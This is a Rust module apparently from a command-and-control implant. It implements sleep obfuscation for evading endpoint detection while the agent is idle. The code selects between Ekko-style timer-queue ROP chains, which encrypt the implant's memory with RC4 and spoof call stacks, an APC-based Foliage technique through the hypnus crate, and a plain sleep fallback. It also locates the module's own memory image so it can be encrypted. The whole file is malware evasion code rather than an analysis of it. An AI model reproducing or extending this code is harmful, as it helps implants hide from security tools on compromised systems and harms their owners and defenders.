//! Sleep obfuscation module for evasion during agent sleep cycles.
//!
//! This module provides multiple sleep obfuscation techniques:
//! - `ekko`: Timer queue based sleep with ROP gadget chains (Ekko/Nighthawk style)
//! - `foliage`: APC-based sleep via hypnus crate
//! - Standard fallback for Linux or when obfuscation fails
//!
//! The Ekko technique mirrors Nighthawk's FOLIAGE by using:
//! - CreateTimerQueueTimer for callback scheduling
//! - SystemFunction032 (RC4) for memory encryption
//! - ROP gadget chains for VirtualProtect → Encrypt → Sleep → Decrypt → Restore
//! - Call stack spoofing via synthetic frames

use std::time::Duration;

#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
mod ekko;

#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
mod stack_spoof;

/// Sleep technique to use for obfuscation
#[derive(Clone, Copy, Debug, Default)]
pub enum SleepTechnique {
    /// Ekko-style timer queue with ROP chains (most evasive)
    #[default]
    Ekko,
    /// APC-based via hypnus foliage! macro
    Foliage,
    /// Standard thread sleep (no obfuscation)
    Standard,
}

/// Global sleep technique selection (can be changed at runtime)
#[cfg(target_os = "windows")]
static SLEEP_TECHNIQUE: std::sync::atomic::AtomicU8 = std::sync::atomic::AtomicU8::new(0);

/// Set the sleep technique to use
#[cfg(target_os = "windows")]
pub fn set_technique(technique: SleepTechnique) {
    use std::sync::atomic::Ordering;
    let val = match technique {
        SleepTechnique::Ekko => 0,
        SleepTechnique::Foliage => 1,
        SleepTechnique::Standard => 2,
    };
    SLEEP_TECHNIQUE.store(val, Ordering::SeqCst);
}

/// Get the current sleep technique
#[cfg(target_os = "windows")]
fn get_technique() -> SleepTechnique {
    use std::sync::atomic::Ordering;
    match SLEEP_TECHNIQUE.load(Ordering::SeqCst) {
        0 => SleepTechnique::Ekko,
        1 => SleepTechnique::Foliage,
        _ => SleepTechnique::Standard,
    }
}

/// Performs an obfuscated sleep for the specified duration in seconds.
///
/// On Windows x86_64, this uses the configured technique (Ekko by default) for
/// sleep obfuscation with memory encryption and call stack spoofing.
/// On other Windows architectures, falls back to Foliage (hypnus).
/// On Linux, this falls back to standard thread::sleep.
///
/// # Arguments
/// * `seconds` - Number of seconds to sleep
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
pub fn obfuscated_sleep(seconds: u64) {
    match get_technique() {
        SleepTechnique::Ekko => {
            // Try Ekko-style timer queue sleep with RC4 and stack spoofing
            if ekko::ekko_sleep(seconds).is_err() {
                // Fall back to foliage on failure
                foliage_sleep(seconds);
            }
        }
        SleepTechnique::Foliage => {
            foliage_sleep(seconds);
        }
        SleepTechnique::Standard => {
            std::thread::sleep(Duration::from_secs(seconds));
        }
    }
}

/// Performs an obfuscated sleep on Windows non-x86_64 architectures.
/// Falls back to Foliage (hypnus) since Ekko requires x86_64 assembly.
#[cfg(all(target_os = "windows", not(target_arch = "x86_64")))]
pub fn obfuscated_sleep(seconds: u64) {
    match get_technique() {
        SleepTechnique::Ekko | SleepTechnique::Foliage => {
            foliage_sleep(seconds);
        }
        SleepTechnique::Standard => {
            std::thread::sleep(Duration::from_secs(seconds));
        }
    }
}

/// Foliage-style sleep using hypnus crate
#[cfg(target_os = "windows")]
fn foliage_sleep(seconds: u64) {
    use core::ffi::c_void;

    if let Some((ptr, size)) = get_module_memory() {
        hypnus::foliage!(ptr, size, seconds);
    } else {
        std::thread::sleep(Duration::from_secs(seconds));
    }
}

/// Performs an obfuscated sleep for the specified duration in seconds.
/// On Linux, this simply uses standard thread::sleep.
#[cfg(target_os = "linux")]
pub fn obfuscated_sleep(seconds: u64) {
    std::thread::sleep(Duration::from_secs(seconds));
}

/// Performs an obfuscated sleep for the specified std::time::Duration.
///
/// This is a convenience wrapper that accepts a Duration instead of raw seconds.
/// Note: Sub-second precision is lost as the obfuscation operates in whole seconds.
///
/// # Arguments
/// * `duration` - Duration to sleep
pub fn obfuscated_sleep_duration(duration: Duration) {
    let seconds = duration.as_secs();
    if seconds == 0 {
        // For sub-second sleeps, use standard sleep to maintain precision
        std::thread::sleep(duration);
    } else {
        obfuscated_sleep(seconds);
    }
}

/// Gets the current module's base address and size for memory encryption.
#[cfg(target_os = "windows")]
pub fn get_module_memory() -> Option<(*mut core::ffi::c_void, usize)> {
    use core::ffi::c_void;
    use std::mem::MaybeUninit;
    use winapi::um::libloaderapi::GetModuleHandleA;
    use winapi::um::processthreadsapi::GetCurrentProcess;
    use winapi::um::psapi::{GetModuleInformation, MODULEINFO};

    unsafe {
        let h_module = GetModuleHandleA(std::ptr::null());
        if h_module.is_null() {
            return None;
        }

        let mut mod_info = MaybeUninit::<MODULEINFO>::uninit();
        let result = GetModuleInformation(
            GetCurrentProcess(),
            h_module,
            mod_info.as_mut_ptr(),
            std::mem::size_of::<MODULEINFO>() as u32,
        );

        if result == 0 {
            return None;
        }

        let mod_info = mod_info.assume_init();
        Some((
            mod_info.lpBaseOfDll as *mut c_void,
            mod_info.SizeOfImage as usize,
        ))
    }
}
